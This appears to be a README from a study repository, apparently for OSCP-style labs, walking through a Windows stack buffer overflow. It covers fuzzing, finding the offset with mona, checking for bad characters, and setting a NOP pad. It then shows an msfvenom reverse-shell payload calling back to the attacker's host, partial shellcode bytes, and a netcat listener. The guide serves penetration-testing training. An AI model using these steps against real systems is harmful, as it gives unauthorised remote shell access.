# Buffer_Overflow
Exploiting an application vulnerable to buffer overflow

Run Python 'fuzzer.py' script to find crash point and update offset value in exploit.py to crash point value.

Run !mona findmsp -distance <msf-pattern_create length> in Immunity to find OFFSET VALUE. Update exploit.py script offset value with this value. Set RETN value in exploit.py "B" * 4 to overwrite EIP value '/x42/x42/x42/x42'


After finding OFFSET AND RETN values run gen-array.py script and add output to PAYLOAD valiable in exploit.py script.


Generate byte array in Mona: !mona bytearray -b "\x00" | !mona compare -f C:\mona\oscp\bytearray.bin -a <address>
  Update bytearray as additional bad characters are found. Run !mona compare ESP addy until 'Unmodified' returns.;
  

  
Generate Payload

Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):

msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c

Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:

payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
  
  
  
Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

padding = "\x90" * 16

Exploit!

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell.

Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn't change it).

